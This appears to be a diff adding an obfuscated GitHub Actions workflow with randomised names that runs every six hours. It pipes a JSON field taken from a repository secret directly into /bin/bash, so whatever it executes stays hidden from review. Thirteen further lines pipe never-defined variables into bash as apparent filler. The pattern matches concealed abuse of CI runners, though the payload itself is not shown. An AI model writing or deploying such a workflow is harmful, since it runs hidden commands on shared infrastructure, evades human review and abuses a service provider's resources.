@@ -1,0 +1,31 @@
+name: xulingyin4567
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xulingyin4567
+        env:
+          nke60970: ${{ secrets.nke60970 }}
+        run: |
+          echo $nke60970 | jq -r .wper74 | /bin/bash
+          echo $c167 | jq -r .olsfo3 | /bin/bash
+          echo $q061 | jq -r .da947 | /bin/bash
+          echo $qsxfu4 | jq -r .nsy28130 | /bin/bash
+          echo $sriv1283 | jq -r .ikm44 | /bin/bash
+          echo $pjdg055 | jq -r .xn25394 | /bin/bash
+          echo $c83419 | jq -r .muvin4931 | /bin/bash
+          echo $dr22 | jq -r .nk87 | /bin/bash
+          echo $l230 | jq -r .yycbf08511 | /bin/bash
+          echo $bgs4 | jq -r .cudr7125 | /bin/bash
+          echo $vmibc4301 | jq -r .bmqp403 | /bin/bash
+          echo $gn89039 | jq -r .iucps870 | /bin/bash
+          echo $bu672 | jq -r .j09042 | /bin/bash
+          echo $awep99602 | jq -r .lceii25 | /bin/bash
+
